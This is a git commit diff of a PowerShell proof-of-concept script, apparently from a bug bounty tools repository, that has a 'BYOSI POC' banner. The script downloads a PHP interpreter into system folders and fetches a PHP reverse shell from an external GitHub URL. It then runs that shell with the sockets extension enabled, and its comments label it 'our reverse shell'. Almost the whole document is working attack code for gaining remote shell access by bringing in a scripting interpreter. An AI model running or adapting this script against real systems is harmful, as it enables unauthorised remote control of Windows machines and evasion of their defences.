caaae1ea4b5b7ba633ea3e86221ae09c6b62d8fd
Joseph McPeters <44779781+fuzzlove@users.noreply.github.com>
2024-09-17 15:53:26 -0500

    Update byostuff.ps1

--- byostuff.ps1
+++ byostuff.ps1
@@ -1,4 +1,25 @@
+<# 
+
+.-. .-')                            .-')                     _ (`-.                          
+\  ( OO )                          ( OO ).                  ( (OO  )                         
+ ;-----.\  ,--.   ,--..-'),-----. (_)---\_)  ,-.-')        _.`     \ .-'),-----.    .-----.  
+ | .-.  |   \  `.'  /( OO'  .-.  '/    _ |   |  |OO)      (__...--''( OO'  .-.  '  '  .--./  
+ | '-' /_).-')     / /   |  | |  |\  :` `.   |  |  \       |  /  | |/   |  | |  |  |  |('-.  
+ | .-. `.(OO  \   /  \_) |  |\|  | '..`''.)  |  |(_/       |  |_.' |\_) |  |\|  | /_) |OO  ) 
+ | |  \  ||   /  /\_   \ |  | |  |.-._)   \ ,|  |_.'       |  .___.'  \ |  | |  | ||  |`-'|  
+ | '--'  /`-./  /.__)   `'  '-'  '\       /(_|  |          |  |        `'  '-'  '(_'  '--'\  
+ `------'   `--'          `-----'  `-----'   `--'          `--'          `-----'    `-----' 
+
+#>
+
+# Download our php interpreter
 wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O C:\\Windows\\Temp\\php.zip
-Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\Windows\\Temp\\php
-wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/phpconnect.php -O C:\\Windows\\Temp\\php\\phpconnect.php
-& "C:\\Windows\\Temp\\php\\php.exe" @('C:\Windows\Temp\php\phpconnect.php')
+
+# Extract from c:\windows\temp\php.zip to c:\php (default path)
+Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\php
+
+# Download our reverse shell
+wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/phpconnect.php -O C:\\php\\index.php
+
+# Run php with required sockets extention for reverse shell
+& "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\index.php')
